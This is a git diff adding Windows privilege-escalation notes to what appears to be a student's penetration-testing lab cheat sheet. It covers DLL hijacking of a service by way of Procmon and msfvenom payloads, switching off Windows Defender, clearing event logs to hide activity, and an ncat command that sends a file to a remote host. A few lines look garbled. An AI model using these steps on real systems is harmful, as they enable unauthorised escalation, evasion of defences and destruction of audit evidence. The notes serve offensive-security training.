@@ -351,3 +351,42 @@ cat <file>> | base64
 Encrypted Transport
 **scp <source> <destination>
 ncat --ssl <ip> <port> < <file>**
+
+ 
+# Checking UAC Settings
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+# Finding Vulnerable Scheduled tasks
+schtasks /query /fo LIST /v
+## for sysinternals suite
+    net use Z: "\\https://live.sysinternals.com" /persistent:yes
+    >mkdir "C:\Program Files (x86)\Putty"
+    >>sc.exe create puttyService binPath="C:\Program Files (x86)\Putty\putty.exe" displayname="puttyservice" start=auto
+    >>icacls "C:\Program Files (x86)\Putty" /grant BUILTIN\Users:W
+    >>start
+     ##run services
+    >>##look for services in not in system 32, wrong spelling, no description. 
+
+    get-psdrive
+    ## go into share drive
+    .\Procmon.exe
+        ##    process Name contain "putty.exe"
+        ##    Path contains ".dll"
+        ##    Result is "NAME NOT FOUND"
+        ###    this finds the dlls the process wants to use
+        ###    look for dll that need to run in the same directory
+
+
+# On linux
+        msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll               
+        scp student@<linopsip>:/home/student/Security/buff/SSPICLI.dll "C:\Program Files(x86)\Putty\" 
+### restart the system and try to rename exe file. putty to ahhellnah
+        msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f exe > putty.exe
+        scp student@<linopsip>:/home/student/Security/buff/SSPICLI.dll "C:\Program Files(x86)\Putty\putty.exe"
+        ##make sure windows defender is off
+
+
+# log enumeration
+    auditpol /get /category:*
+    auditpol /get /category:* | findstr /i "success failure"
+    Clear-Eventlog -Log Application, System
